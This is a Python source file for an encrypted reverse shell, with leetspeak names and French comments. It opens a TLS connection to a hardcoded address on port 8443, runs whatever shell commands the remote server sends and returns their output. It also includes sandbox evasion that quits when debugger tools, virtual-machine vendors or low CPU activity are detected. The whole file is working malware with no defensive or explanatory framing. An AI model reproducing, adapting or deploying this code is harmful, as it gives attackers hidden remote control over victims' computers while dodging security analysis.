# -*- coding: utf-8 -*-
import socket
import ssl
import os
import subprocess
import sys
import random
import time



C3RT_5erV3ur = """-----BEGIN CERTIFICATE-----
MIID9zCCAt+gAwIBAgIUYJKJn5bXKPwqp3uv6+S1QiyHFskwDQYJKoZIhvcNAQEL
BQAwgYoxCzAJBgNVBAYTAkFMMREwDwYDVQQIDAhUZXJtYXRlYzEOMAwGA1UEBwwF
WmV1YmkxETAPBgNVBAoMCDNhbmRNb3VrMQ8wDQYDVQQLDAZPa2h0ZWsxDjAMBgNV
BAMMBUdlZGVrMSQwIgYJKoZIhvcNAQkBFhViZWJla2Vsa2VsYkAzYXRheS56ZWIw
HhcNMjUwMTAyMjMxNjUwWhcNMjYwMTAyMjMxNjUwWjCBijELMAkGA1UEBhMCQUwx
ETAPBgNVBAgMCFRlcm1hdGVjMQ4wDAYDVQQHDAVaZXViaTERMA8GA1UECgwIM2Fu
ZE1vdWsxDzANBgNVBAsMBk9raHRlazEOMAwGA1UEAwwFR2VkZWsxJDAiBgkqhkiG
9w0BCQEWFWJlYmVrZWxrZWxiQDNhdGF5LnplYjCCASIwDQYJKoZIhvcNAQEBBQAD
ggEPADCCAQoCggEBAKDjmLuvwfjmXKyV/ETZIvVUeN3d0vTlNy9rDt8wuA2v0YZ/
dfb3iRXvMb1G8SThOQs94gX0MK7bwp8LAsgHmpSGRMkTRLos99/hyczk7+Ejv2zU
EKi3Aki/1FITRELssme1jofcVtJ0VwwUJKC/wA6+u4ZpA/8GIYHKJrZVe6rBbNw+
t3DTKZchmrrNiU5RcMnEozI+4BGBLz7SZCe1tr3mYW1brN0ZkZTMMGJh9aTYRIXd
BdjcGisb1Mt7o1nxljMjFRR1QLkB+lq/x7fswmU+x639Lgghm3FbU7LytcLF7uPP
tJnB7iZPQ2p+NR0WmZmSIERRmlSiub+9IMxMP/0CAwEAAaNTMFEwHQYDVR0OBBYE
FORyi5LJqn/RTem0pCJv/O9IDFW3MB8GA1UdIwQYMBaAFORyi5LJqn/RTem0pCJv
/O9IDFW3MA8GA1UdEwEB/wQFMAMBAf8wDQYJKoZIhvcNAQELBQADggEBAHs7xM3J
fIVbfUrauwpPRtcLKBSa+vAkgFOqb9vehXwvuPTb22zYym6HyAKVGFJi8rMdKJPl
6Ymau2jY5IvI8TIVh6EtDN+f6M8j5D7wxmNRQFy0r3PmwPMzonEIK4LhSvQEfi3b
a+GQuqNYAT4Nv/CDPds4sltxbBgDERAP1d4J39NdrFX46tlSNBS/D3CFEsm4mhZq
Bqs4k/frIs2+BimYaYk8oY3w22+hmdFPFQetLjKhqIQ606dHJA1tDhMw/fSTV0RI
ZVlt7wOUL7GeFuZsQ67ez+7WrwsUBaBuoN3mXUH0L0wfJ9tQtG7mp1ti396UKYuR
k41DKdLRahoz/5E=
-----END CERTIFICATE-----
"""

R4nd0m_Addr3ss = "192.168.1.40"
R4nd0m_P0rt = 8443

def G3nR4nd0mN0m():
    return ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=10))

import socket
import ssl
import os
import subprocess

def C4nn3x4v3c5eR():
    try:
        with socket.create_connection((R4nd0m_Addr3ss, R4nd0m_P0rt)) as sock:
            context_5 = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
            context_5.load_verify_locations(cadata=C3RT_5erV3ur)
            context_5.check_hostname = False
            with context_5.wrap_socket(sock, server_hostname=None) as secure_socket:
                while True:
                    data = secure_socket.recv(4096)
                    if not data:  # connexion fermée
                        break
                    C0mm4nd3 = data.decode('utf-8', errors='ignore').strip()
                    if C0mm4nd3.lower() in ("exit", "quit"):
                        break

                    # Gestion spéciale de cd pour que le changement persiste
                    if C0mm4nd3.startswith("cd "):
                        target = C0mm4nd3[3:].strip().strip('"').strip("'")
                        try:
                            os.chdir(os.path.expanduser(target))
                            R3sultat = f"Changed dir to: {os.getcwd()}\n"
                        except Exception as e:
                            R3sultat = f"cd error: {e}\n"
                        secure_socket.sendall(R3sultat.encode('utf-8', errors='ignore'))
                        continue

                    try:
                        completed = subprocess.run(
                            C0mm4nd3,
                            shell=True,
                            capture_output=True,
                            text=True,
                            timeout=60
                        )
                        out = completed.stdout or ""
                        err = completed.stderr or ""
                        if out == "" and err == "":
                            R3sultat = "(no output)\n"
                        else:
                            R3sultat = out + err
                    except subprocess.TimeoutExpired:
                        R3sultat = "Command timed out.\n"
                    except Exception as e:
                        R3sultat = f"Execution error: {e}\n"

                    try:
                        secure_socket.sendall(R3sultat.encode('utf-8', errors='ignore'))
                    except Exception as send_err:
                        break

    except ssl.SSLEOFError:
        pass
    except Exception as e:
        pass


def V3r1f13Nv1r0nn3m3nt():
    T00ls_D3b00g = ["dbg", "trace", "gdb", "ldd"]
    if any(tool in os.getenv("PATH", "").lower() for tool in T00ls_D3b00g):
        sys.exit(1)

    M1ch1n3_Virt = ["/sys/devices/virtual/dmi/id/product_name", "/sys/devices/virtual/dmi/id/sys_vendor"]
    for path in M1ch1n3_Virt:
        if os.path.exists(path):
            with open(path, "r") as f:
                content = f.read().lower()
                if any(keyword in content for keyword in ["virtualbox", "vmware", "qemu", "kvm"]):
                    sys.exit(1)

    if os.cpu_count() < 2 or os.getloadavg()[0] < 0.5:
        sys.exit(1)

if __name__ == "__main__":
    random.seed(time.time())
    V3r1f13Nv1r0nn3m3nt()
    C4nn3x4v3c5eR()
